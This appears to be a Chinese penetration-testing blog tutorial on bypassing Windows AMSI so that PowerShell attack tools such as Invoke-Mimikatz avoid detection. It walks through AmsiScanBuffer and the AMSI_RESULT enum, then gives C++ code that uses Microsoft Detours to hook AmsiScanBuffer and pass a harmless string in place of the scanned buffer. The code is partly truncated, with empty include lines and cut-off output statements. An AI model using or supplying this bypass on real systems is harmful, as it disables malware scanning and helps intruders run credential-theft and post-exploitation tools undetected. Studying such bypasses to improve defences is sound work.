## TL;DR
  * 之前大概学过相关的技术但没认真研究和总结过，最近又研究学习了一下，这里做一下总结和分享。大家在渗透的时候都用过powershell，powershell的功能可谓非常之强大，常用于信息搜集、入侵、下载、提权、权限维持、横向移动等。常用的框架有powersploit、Empire、Nishang等，那AMSI又是啥？ AMSI(Anti-Malware Scan Interface)，即反恶意软件扫描接口，在win10和server2016上默认安装。如在使用mimikatz的powershell版时候会遇到如下的错误。  
产生这一错误的原因即为AMSI防护的效果。那么防护的原理是啥以及如果绕过呢？
### 初步想法
  * 这个是网上已经公开了的绕过AMSI的技术，但理解并且掌握整个过程同样因缺斯听，它可以用来绕过一些安全机制比如说ETW（Event Tracing for Windows）。这里要感谢MDSec以及RdpTheif工具的作者oxo9AL，RdpTheif工具使用了相似的技术。
  * AMSI理论上是个很好的想法，在恶意脚本在执行的过程中去分析判断，然而这个理论在落地的时候存在缺陷，最终项目的代码可参考[AmsiHook](https://github.com/tomcarver16/AmsiHook)  
  * 可以看到尽管"Invoke-Mimikatz"这个字符串没有恶意执行的上下文可依然被检测并拦截，它是怎么工作的呢，微软在某些进程中加载了amsi.dll，并导出了一些函数功能供杀软和EDR去使用，当然这其中主要是微软自家的Windows Defender。  
  * 如上所示，可以看到在启动powershell进程的时候加载了amsi.dll.
  * 查看amsi.dll中的导出函数，可以看到一个这样函数AmsiScanBuffer，在msdn上查找这个函数.
        HRESULT AmsiScanBuffer(
    HAMSICONTEXT amsiContext,
    PVOID        buffer,
    ULONG        length,
    LPCWSTR      contentName,
    HAMSISESSION amsiSession,
    AMSI_RESULT  *result
    );
  * 传递给AmsiScanBuffer函数的最后一个参数是一个枚举类型指针名字为result，这个result将决定执行这个脚本是否是恶意。
    typedef enum AMSI_RESULT {
      AMSI_RESULT_CLEAN,
      AMSI_RESULT_NOT_DETECTED,
      AMSI_RESULT_BLOCKED_BY_ADMIN_START,
      AMSI_RESULT_BLOCKED_BY_ADMIN_END,
      AMSI_RESULT_DETECTED
    };
  * 理论上如果能控制这个result（比如让它固定返回为AMSI_RESULT_CLEAN），AMSI就可能被绕过，所以该如何做呢？虽然amsi.dll注入到了进程，但是并没有内核驱动去保障amsi.dll是否被篡改，基于此让我们找个绕过的方法。
### HOOK函数
  * HOOK函数可以让我们在调用这个函数之前控制这个函数，作为攻击者我们能做的事情很多，比如记录参数日志、允许或者拦截函数的执行、覆盖传入这个函数的参数、修改函数的返回值，我们现在需要找到hook AmsiScanBuffer函数的方法，这里可使用微软提供的hook函数库detours。
  * 在这之前，你需要先编译detours成静态链接库，可以[参考文章](https://blog.csdn.net/qing666888/article/details/81540683),注意这里编译成X64版本的。因为后面注入的powershell也是64位的进程，所以amsihook.dll就需要是64位，那么这个静态链接库我们也需要编译成64位。
    #include 
    #include 
    #include 
    static int(WINAPI* OriginalMessageBox)(HWND hWnd, LPCWSTR lpText, LPCWSTR lpCaption, UINT uType) = MessageBox;
    int WINAPI _MessageBox(HWND hWnd, LPCSTR lpText, LPCTSTR lpCaption, UINT uType) {
        return OriginalMessageBox(NULL, L"We've used detours to hook MessageBox", L"Hooked Window", 0);
    }
    int main() {
        std::cout 
    #include 
    #include 
    #include 
    #pragma comment(lib, "amsi.lib")
    ////使用EICAR标准进行测试 https://en.wikipedia.org/wiki/EICAR_test_file
    #define EICAR "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
    const char* GetResultDescription(HRESULT hRes) {
        const char* description;
        switch (hRes)
        {
        case AMSI_RESULT_CLEAN:
            description = "AMSI_RESULT_CLEAN";
            break;
        case AMSI_RESULT_NOT_DETECTED:
            description = "AMSI_RESULT_NOT_DETECTED";
            break;
        case AMSI_RESULT_BLOCKED_BY_ADMIN_START:
            description = "AMSI_RESULT_BLOCKED_BY_ADMIN_START";
            break;
        case AMSI_RESULT_BLOCKED_BY_ADMIN_END:
            description = "AMSI_RESULT_BLOCKED_BY_ADMIN_END";
            break;
        case AMSI_RESULT_DETECTED:
            description = "AMSI_RESULT_DETECTED";
            break;
        default:
            description = "";
            break;
        }
        return description; 
    }
    int main() {
        HAMSICONTEXT amsiContext;
        HRESULT hResult = S_OK;
        AMSI_RESULT res = AMSI_RESULT_CLEAN;
        HAMSISESSION hSession = nullptr;
        LPCWSTR fname = L"EICAR";
        BYTE* sample = (BYTE*)EICAR;
        ULONG size = strlen(EICAR);
        ZeroMemory(&amsiContext, sizeof(amsiContext));
        hResult = AmsiInitialize(L"AmsiHook", &amsiContext);
        if (hResult != S_OK) {
            std::cout 
  * 有了测试AmsiScanBuffer的基础代码，我们使用刚才在hook messagebox中使用的方法来hook AmsiScanBuffer
    #include 
    #include 
    #include 
    #include 
    #include 
    #pragma comment(lib, "amsi.lib")
    #define EICAR "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
    #define SAFE "SafeString"
    //Converts number given out by AmsiScanBuffer into a readable string
    const char* GetResultDescription(HRESULT hRes) {
        const char* description;
        switch (hRes)
        {
        case AMSI_RESULT_CLEAN:
            description = "AMSI_RESULT_CLEAN";
            break;
        case AMSI_RESULT_NOT_DETECTED:
            description = "AMSI_RESULT_NOT_DETECTED";
            break;
        case AMSI_RESULT_BLOCKED_BY_ADMIN_START:
            description = "AMSI_RESULT_BLOCKED_BY_ADMIN_START";
            break;
        case AMSI_RESULT_BLOCKED_BY_ADMIN_END:
            description = "AMSI_RESULT_BLOCKED_BY_ADMIN_END";
            break;
        case AMSI_RESULT_DETECTED:
            description = "AMSI_RESULT_DETECTED";
            break;
        default:
            description = "";
            break;
        }
        return description; 
    }
    //Store orignal version of AmsiScanBuffer
    static HRESULT(WINAPI* OriginalAmsiScanBuffer)(HAMSICONTEXT amsiContext, 
                                                    PVOID buffer, ULONG length, 
                                                    LPCWSTR contentName, 
                                                    HAMSISESSION amsiSession, 
                                                    AMSI_RESULT* result) = AmsiScanBuffer;
    //Our user controlled AmsiScanBuffer
    HRESULT _AmsiScanBuffer(HAMSICONTEXT amsiContext,
        PVOID buffer, ULONG length,
        LPCWSTR contentName,
        HAMSISESSION amsiSession,
        AMSI_RESULT* result) {
        return OriginalAmsiScanBuffer(amsiContext, (BYTE*)SAFE, length, contentName, amsiSession, result);